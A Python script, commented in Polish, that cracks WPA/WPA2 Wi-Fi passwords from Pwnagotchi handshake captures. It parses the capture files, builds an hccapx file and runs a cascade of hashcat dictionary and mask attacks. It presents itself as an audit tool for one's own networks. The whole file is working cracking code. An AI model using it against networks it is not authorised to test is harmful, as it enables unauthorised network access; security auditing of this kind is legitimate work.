#!/usr/bin/env python3
"""
crack_pwnagotchi.py — audyt sily hasla WPA/WPA2 z pliku handshake Pwnagotchi.

Bierze JEDEN plik zrzutu (.pcap / .pcapng / .hc22000), wyciaga spojny handshake,
buduje poprawny hccapx i uruchamia kaskade atakow hashcatem na GPU.

UZYCIE TYLKO DO WLASNYCH SIECI lub z pisemna zgoda wlasciciela.

    python3 crack_pwnagotchi.py <plik> [--essid NAZWA] [--wordlist SCIEZKA]
                                       [--max-mask-min N] [--only-verify HASLO]

Wnioski techniczne wbudowane w skrypt (zdobyte "na twardo" podczas audytu):
  1. Pwnagotchi czesto zapisuje KILKA handshake'ow w jednym pcap. Nonce (ANONCE z M1,
     SNONCE z M2) MUSZA pochodzic z TEJ SAMEJ sesji, inaczej MIC nigdy sie nie zgadza.
  2. W strukturze hccapx pole EAPOL musi miec MIC WYZEROWANY (16 bajtow), bo hashcat
     sam tam wpisuje liczony MIC. Z oryginalnym MIC hashcat nie zlamie nawet poprawnego hasla.
"""
import argparse, os, struct, subprocess, sys, tempfile, hashlib, hmac, shutil

MIC_OFFSET_IN_EAPOL = 81   # pole key-MIC w ramce EAPOL-Key
NONCE_OFFSET = 17          # wpa_key_nonce w ramce EAPOL-Key


# ---------- parsowanie pcap ----------
def read_pcap_frames(data):
    """Zwraca liste ramek (bytes) z klasycznego pcap. Wykrywa endianness po magic."""
    magic = data[:4]
    if magic == b'\xd4\xc3\xb2\xa1':      # zapisany byteswapped -> na LE hoscie '<' daje sens
        e = '<'
    elif magic == b'\xa1\xb2\xc3\xd4':
        e = '<'
    elif magic == b'\x0a\x0d\x0d\x0a':
        return None  # pcapng — obsluzony osobno
    else:
        e = '<'
    frames = []
    off = 24
    while off + 16 <= len(data):
        _, _, caplen, _ = struct.unpack(e + 'IIII', data[off:off+16])
        off += 16
        if caplen <= 0 or off + caplen > len(data):
            break
        frames.append(data[off:off+caplen])
        off += caplen
    return frames


def read_pcapng_frames(data):
    """Minimalny parser pcapng: wyciaga Enhanced/Simple Packet Blocks."""
    frames = []
    off = 0
    e = '<'
    while off + 12 <= len(data):
        btype, blen = struct.unpack(e + 'II', data[off:off+8])
        if blen < 12 or off + blen > len(data):
            break
        body = data[off+8:off+blen-4]
        if btype == 0x00000006 and len(body) >= 20:      # Enhanced Packet Block
            caplen = struct.unpack(e + 'I', body[12:16])[0]
            frames.append(body[20:20+caplen])
        elif btype == 0x00000003 and len(body) >= 4:     # Simple Packet Block
            frames.append(body[4:])
        off += blen
    return frames


def eapol_of(frame):
    i = frame.find(b'\x88\x8e')
    return frame[i+2:] if i >= 0 else None


def dot11_macs(frame):
    """addr1(dst)/addr2(src) z naglowka 802.11 (linktype 105, bez radiotap)."""
    return frame[4:10], frame[10:16]


def extract_handshakes(frames):
    """Zwraca liste spojnych handshake'ow: dict(anonce, snonce, mic, eapol, ap, sta)."""
    hs = []
    last_m1 = None
    for f in frames:
        ek = eapol_of(f)
        if not ek or len(ek) < MIC_OFFSET_IN_EAPOL + 16:
            continue
        ki = int.from_bytes(ek[5:7], 'big')
        ack, mic = bool(ki & 0x80), bool(ki & 0x100)
        if ack and not mic:                     # M1 (od AP): niesie ANONCE
            a1, a2 = dot11_macs(f)              # a1=STA(dst) a2=AP(src)
            last_m1 = {'anonce': ek[NONCE_OFFSET:NONCE_OFFSET+32], 'ap': a2, 'sta': a1}
        elif mic and not ack and last_m1:       # M2 (od STA): niesie SNONCE + MIC
            # a1=AP(dst) a2=STA(src). MAC bierzemy z M1 (pewniejsze), M2 jako fallback.
            a1, a2 = dot11_macs(f)
            total = int.from_bytes(ek[2:4], 'big') + 4
            hs.append({
                'anonce': last_m1['anonce'],
                'snonce': ek[NONCE_OFFSET:NONCE_OFFSET+32],
                'mic':    ek[MIC_OFFSET_IN_EAPOL:MIC_OFFSET_IN_EAPOL+16],
                'eapol':  ek[:total],
                'ap':     last_m1['ap'] if last_m1['ap'] != b'\x00'*6 else a1,
                'sta':    last_m1['sta'] if last_m1['sta'] != b'\x00'*6 else a2,
            })
    return hs


# ---------- parsowanie hc22000 (gdy podano gotowy plik) ----------
def handshake_from_hc22000(line):
    p = line.strip().split('*')
    if len(p) < 9 or p[0] != 'WPA':
        return None
    eapol = bytes.fromhex(p[7])
    return {
        'mic':    bytes.fromhex(p[2]),
        'ap':     bytes.fromhex(p[3]),
        'sta':    bytes.fromhex(p[4]),
        'essid':  bytes.fromhex(p[5]),
        'anonce': bytes.fromhex(p[6]),
        'snonce': eapol[NONCE_OFFSET:NONCE_OFFSET+32],
        'eapol':  eapol,
    }


# ---------- weryfikacja/MIC ----------
def compute_mic(password, essid, ap, sta, anonce, snonce, eapol, keyver=2):
    pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), essid, 4096, 32)
    b = (b"Pairwise key expansion\x00" + min(ap, sta) + max(ap, sta) +
         min(anonce, snonce) + max(anonce, snonce))
    ptk = b''
    i = 0
    while len(ptk) < 64:
        ptk += hmac.new(pmk, b + bytes([i]), hashlib.sha1).digest()
        i += 1
    eapol0 = eapol[:MIC_OFFSET_IN_EAPOL] + b'\x00'*16 + eapol[MIC_OFFSET_IN_EAPOL+16:]
    h = hashlib.md5 if keyver == 1 else hashlib.sha1
    return hmac.new(ptk[:16], eapol0, h).digest()[:16]


# ---------- budowa hccapx ----------
def build_hccapx(hs, essid, path):
    """hccapx v4. KLUCZOWE: EAPOL z WYZEROWANYM polem MIC."""
    eapol = hs['eapol']
    eapol_z = eapol[:MIC_OFFSET_IN_EAPOL] + b'\x00'*16 + eapol[MIC_OFFSET_IN_EAPOL+16:]
    essid = essid[:32]
    o  = b'HCPX' + struct.pack('<I', 4) + bytes([0]) + bytes([len(essid)])
    o += essid + b'\x00'*(32-len(essid))
    o += bytes([2]) + hs['mic'] + hs['ap'] + hs['anonce'] + hs['sta'] + hs['snonce']
    o += struct.pack('<H', len(eapol_z)) + eapol_z + b'\x00'*(256-len(eapol_z))
    open(path, 'wb').write(o)


# ---------- slowniki i reguly ----------
# Lokalne slowniki systemowe (Ubuntu: pakiety wpolish/wamerican/wbritish).
SYSTEM_DICTS = [
    '/usr/share/dict/polish',
    '/usr/share/dict/american-english',
    '/usr/share/dict/british-english',
]

# Reguly pod typowe wzorce hasel Wi-Fi. Stosowane przez --stdout (CPU), NIE przez -r na GPU
# (hashcat 5.1.0 ma bug: kernel regul na GPU dla WPA generuje inne kandydaty niz --stdout).
WIFI_RULES = r"""c $1 $!
c $a $1 $!
c Z1 $1 $!
$1 $!
c $!
c $1 $2 $3
c $1 $2 $3 $!
c $2 $0 $2 $0
:
"""


def build_plen_wordlist(path, minlen=3, maxlen=12):
    """Laczy dostepne slowniki systemowe (PL+EN) w jeden unikalny plik. Zwraca sciezke lub None."""
    srcs = [d for d in SYSTEM_DICTS if os.path.exists(d)]
    if not srcs:
        return None
    seen = set()
    with open(path, 'w', encoding='utf-8', errors='ignore') as out:
        for d in srcs:
            for ln in open(d, encoding='utf-8', errors='ignore'):
                w = ln.strip()
                if minlen <= len(w) <= maxlen and w not in seen:
                    seen.add(w)
                    out.write(w + '\n')
    return path if seen else None


# ---------- hashcat ----------
def show_cracked(hccapx, potfile):
    r = subprocess.run(['hashcat', '-m', '2500', hccapx, '--show',
                        '--potfile-path', potfile], capture_output=True, text=True)
    for ln in r.stdout.splitlines():
        if ':' in ln and ln.strip():
            return ln.strip().split(':')[-1]
    return None


def run_dict_piped(name, hccapx, potfile, wordlist, rulefile):
    """Atak slownikowy: reguly stosuje --stdout (CPU), GPU dostaje gotowe kandydaty bez -r.
    Omija bug regul na GPU w hashcat 5.1.0."""
    print(f"\n>>> {name}", flush=True)
    gen = subprocess.Popen(['hashcat', '--stdout', wordlist, '-r', rulefile],
                           stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    hc = subprocess.run(['hashcat', '-m', '2500', '--force', '--potfile-path', potfile,
                         hccapx, '-a', '0'],
                        stdin=gen.stdout, capture_output=True, text=True)
    if gen.stdout:
        gen.stdout.close()
    gen.wait()
    pw = show_cracked(hccapx, potfile)
    if pw:
        print(f"    [+] ZLAMANE: {pw}", flush=True)
    else:
        print("    [-] brak trafienia", flush=True)
    return pw


def run_attack(name, hccapx, potfile, attack_args):
    """attack_args to np. ['-a','3','-1','?l?d','?u?1?1?1?1?1?d!'] lub ['-a','0',wordlist].
    KOLEJNOSC (hashcat 5.x): opcje, potem PLIK HASHA, potem maska/slownik na koncu."""
    print(f"\n>>> {name}", flush=True)
    cmd = ['hashcat', '-m', '2500', '--force', '--potfile-path', potfile,
           '--status', '--status-timer', '30', '-O', hccapx] + attack_args
    r = subprocess.run(cmd, capture_output=True, text=True)
    # wykryj bledy uzycia (zla maska/plik) zamiast cicho raportowac "brak trafienia"
    err = (r.stderr or '').strip()
    if 'No such file' in err or 'Separator' in err or 'Token' in err:
        print(f"    [!] BLAD hashcat: {err.splitlines()[-1]}", flush=True)
        return None
    pw = show_cracked(hccapx, potfile)
    if pw:
        print(f"    [+] ZLAMANE: {pw}", flush=True)
    else:
        print("    [-] brak trafienia", flush=True)
    return pw


def main():
    ap = argparse.ArgumentParser(description="Audyt WPA2 z pliku Pwnagotchi.")
    ap.add_argument('plik', help='.pcap / .pcapng / .hc22000')
    ap.add_argument('--essid', help='ESSID sieci (jesli nie da sie wykryc z pliku)')
    ap.add_argument('--wordlist', help='sciezka do slownika (opcjonalnie)')
    ap.add_argument('--max-mask-min', type=int, default=180,
                    help='limit czasu na maski w minutach (info, nie twardy stop)')
    ap.add_argument('--only-verify', help='tylko sprawdz to jedno haslo i wyjdz')
    a = ap.parse_args()

    if not shutil.which('hashcat'):
        sys.exit("BLAD: brak hashcat w PATH. Zainstaluj: sudo apt install -y hashcat")

    data = open(a.plik, 'rb').read()
    ext = os.path.splitext(a.plik)[1].lower()

    # --- zbierz handshake ---
    if ext == '.hc22000' or data[:4] == b'WPA*' or data[:3] == b'WPA':
        hs = handshake_from_hc22000(data.decode(errors='replace').splitlines()[0])
        if hs is None:
            sys.exit("BLAD: nie udalo sie sparsowac linii hc22000 (format WPA*02*...).")
        essid = hs['essid']
    else:
        frames = read_pcapng_frames(data) if data[:4] == b'\x0a\x0d\x0d\x0a' \
                 else read_pcap_frames(data)
        hss = extract_handshakes(frames or [])
        if not hss:
            sys.exit("BLAD: nie znaleziono spojnego handshake (M1+M2) w pliku.")
        print(f"[i] Znaleziono {len(hss)} spojnych handshake'ow — biore pierwszy.")
        hs = hss[0]
        # ESSID: z argumentu, albo sprobuj z nazwy pliku (Pwnagotchi: MAC_ESSID_ID.pcap)
        if a.essid:
            essid = a.essid.encode()
        else:
            base = os.path.basename(a.plik)
            parts = base.replace('.pcap', '').replace('.pcapng', '').split('_')
            # format 80_AF_..._ESSID_ID_NNN -> ESSID to segment przed 'ID'
            essid = None
            if 'ID' in parts:
                idx = parts.index('ID')
                if idx >= 7:  # 6 oktetow MAC + ESSID
                    essid = '_'.join(parts[6:idx]).encode()
            if not essid:
                sys.exit("BLAD: nie wykryto ESSID — podaj --essid NAZWA.")
        hs['essid'] = essid

    print(f"[i] ESSID={essid.decode(errors='replace')} "
          f"AP={hs['ap'].hex()} STA={hs['sta'].hex()}")

    # --- tylko weryfikacja jednego hasla ---
    if a.only_verify:
        got = compute_mic(a.only_verify, essid, hs['ap'], hs['sta'],
                          hs['anonce'], hs['snonce'], hs['eapol'])
        ok = got == hs['mic']
        print(f"[i] MIC obliczony={got.hex()} target={hs['mic'].hex()} -> "
              f"{'PASUJE' if ok else 'NIE pasuje'}")
        sys.exit(0 if ok else 1)

    # --- zbuduj hccapx i sanity-check silnika ---
    tmp = tempfile.mkdtemp(prefix='pwncrack_')
    hccapx = os.path.join(tmp, 'target.hccapx')
    potfile = os.path.join(tmp, 'found.pot')
    build_hccapx(hs, essid, hccapx)
    print(f"[i] hccapx: {hccapx}")

    # --- kaskada atakow (od najtanszych/najskuteczniejszych) ---
    found = None

    # Atak 1: slownik. Wybor slownika: --wordlist jesli podany, inaczej zbuduj PL+EN
    # z lokalnych slownikow systemowych. Reguly stosowane przez --stdout (CPU), potem
    # kandydaty leca na GPU (hashcat -m 2500) — samo lamanie WPA nadal na GPU.
    rulefile = os.path.join(tmp, 'wifi.rule')
    open(rulefile, 'w').write(WIFI_RULES)

    wl = a.wordlist if (a.wordlist and os.path.exists(a.wordlist)) else \
        build_plen_wordlist(os.path.join(tmp, 'plen.txt'))
    if wl:
        src = "podany slownik" if a.wordlist else "slownik PL+EN (systemowy)"
        found = run_dict_piped(f"Atak 1: {src} + reguly wzorcowe", hccapx, potfile, wl, rulefile)
    else:
        print("\n>>> Atak 1: slownik — POMINIETY (brak slownikow systemowych ani --wordlist)")

    if not found:
        found = run_attack("Atak 2: 8 cyfr (PIN/data)", hccapx, potfile,
                           ['-a', '3', '?d?d?d?d?d?d?d?d'])
    if not found:
        found = run_attack("Atak 3: wielka+5 malych+2 cyfry", hccapx, potfile,
                           ['-a', '3', '?u?l?l?l?l?l?d?d'])
    if not found:
        found = run_attack("Atak 4: wielka+5 malych+cyfra+znak (~10 min)", hccapx, potfile,
                           ['-a', '3', '-1', '?l?d', '?u?1?1?1?1?1?d!'])
    if not found:
        found = run_attack("Atak 5: 8 znakow alfanum (dlugo)", hccapx, potfile,
                           ['-a', '3', '-1', '?l?u?d', '?1?1?1?1?1?1?1?1'])

    print("\n" + "="*60)
    if found:
        print(f"[+] HASLO ZLAMANE: {found}")
        print("[!] To slabe haslo — zmien je na dluzsze/losowe (4+ niepowiazane slowa).")
    else:
        print("[-] Nie zlamano w uruchomionych atakach.")
        print("    Haslo jest odporne na typowe wzorce — to dobry znak.")
    print("="*60)
    shutil.rmtree(tmp, ignore_errors=True)


if __name__ == '__main__':
    main()
